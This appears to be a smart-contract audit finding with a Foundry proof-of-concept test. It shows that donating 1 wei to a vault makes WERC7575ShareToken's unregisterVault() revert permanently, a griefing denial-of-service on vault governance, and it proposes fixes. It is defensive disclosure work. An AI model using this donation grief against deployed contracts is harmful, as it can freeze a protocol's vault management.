  "body": "## Finding description and impact\n\nThe `unregisterVault()` function in `WERC7575ShareToken.sol` blocks vault removal when either `IERC7575Vault(vaultAddress).totalAssets()` or `ERC20(asset).balanceOf(vaultAddress)` is non-zero:\n\n```solidity\nif (totalAssets != 0) revert CannotUnregisterVaultAssetBalance();\nif (vaultBalance != 0) revert CannotUnregisterVaultAssetBalance();\n```\n\nThis logic assumes that any asset balance in the vault represents user liabilities. However, anyone can **grief the protocol** by sending (“donating”) even 1 wei of the asset directly to the vault. Since the vault may not have a withdrawal/sweep mechanism, this **permanently forces `vaultBalance != 0`**, causing `unregisterVault()` to **always revert**.\n\nAs a result, an attacker can **DoS protocol governance** and prevent vault lifecycle operations, including:\n\n* Removing deprecated or faulty vaults\n* Migrating users to a new vault implementation\n* Cleaning up stale vault registry entries\n\nNo user funds are lost, but the protocol’s ability to manage and evolve vault infrastructure becomes hostage to any third-party donation.\n\n---\n\n## Recommended mitigation steps\n\nUse a condition that reflects **protocol liabilities**, not raw token balances. Possible fixes include:\n\n* Check **share supply or internal accounting** instead of `balanceOf(vaultAddress)`\n* Permit unregistration if vault assets are below a **dust threshold**\n* Add a **sweep/rescue mechanism** to clear arbitrary donations before unregistering",
  "proof_of_concept": "Create a new file in test folder, run it with:\n```bash\nforge test -vvv --match-test test_UnregisterVaultWithAssetBalanceAuditIssue\n```\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.30;\n\nimport \"../src/ERC20Faucet.sol\";\nimport \"../src/WERC7575ShareToken.sol\";\nimport \"../src/WERC7575Vault.sol\";\nimport \"../src/interfaces/IERC7575Errors.sol\";\nimport \"@openzeppelin/contracts/interfaces/draft-IERC6093.sol\";\nimport \"forge-std/Test.sol\";\nimport \"forge-std/console.sol\";\n\n/**\n * @title WERC7575ShareToken Coverage Tests\n * @notice Tests to improve code coverage of critical functions\n * @dev Focuses on error paths, edge cases, and boundary conditions\n */\ncontract WERC7575ShareTokenCoverageTests is Test {\n    WERC7575ShareToken public shareToken;\n    ERC20Faucet public token;\n    WERC7575Vault public vault;\n\n    address public validator;\n    address public revenueAdmin;\n    address public user1;\n    address public user2;\n    address public user3;\n\n    uint256 constant INITIAL_BALANCE = 1000 * 1e18;\n\n    function setUp() public {\n        user1 = makeAddr(\"user1\");\n        validator = makeAddr(\"validator\");\n        revenueAdmin = makeAddr(\"revenueAdmin\");\n\n        token = new ERC20Faucet(\"Test Token\", \"TEST\", 100000 * 1e18);\n        shareToken = new WERC7575ShareToken(\"Test Share\", \"tSHARE\");\n        vault = new WERC7575Vault(address(token), shareToken);\n\n        // Register vault for this asset before usage\n        shareToken.registerVault(address(token), address(vault));\n\n        // Configure roles\n        shareToken.setValidator(validator);\n        shareToken.setKycAdmin(validator);\n        shareToken.setRevenueAdmin(revenueAdmin);\n\n        // Setup token faucet distribution\n        vm.warp(block.timestamp + 2 hours); // avoid faucet cooldown\n        token.faucetAmountFor(user1, INITIAL_BALANCE);\n\n        // Enable KYC for participating users\n        vm.prank(validator);\n        shareToken.setKycVerified(user1, true);\n    }\n\n    /**\n     * @notice Demonstrates the audit issue — vault unregistration can be DoS'ed\n     * @dev Anyone can grief the protocol by sending dust to the vault, making unregisterVault revert permanently\n     */\n    function test_UnregisterVaultWithAssetBalanceAuditIssue() public {\n        /////////////////////////////////////////////////\n        // Step 1: Remove vault when it has zero balance\n        /////////////////////////////////////////////////\n\n        // Expected to succeed because the vault has no assets yet\n        shareToken.unregisterVault(address(token));\n\n        /////////////////////////////////////////////////\n        // Step 2: Re-register vault then grief it\n        /////////////////////////////////////////////////\n\n        // Register the vault again\n        shareToken.registerVault(address(token), address(vault));\n\n        // User (or attacker) sends 1 wei to vault directly\n        // — this does *not* represent user deposits, but still increases raw vault balance\n        vm.prank(user1);\n        token.transfer(address(vault), 1);\n\n        /////////////////////////////////////////////////\n        // Step 3: Attempt unregistration — should now revert forever\n        /////////////////////////////////////////////////\n\n        // The revert is expected because the donated dust makes vaultBalance != 0\n        vm.expectRevert(\n            IERC7575Errors.CannotUnregisterVaultAssetBalance.selector\n        );\n        shareToken.unregisterVault(address(token));\n    }\n}\n```",
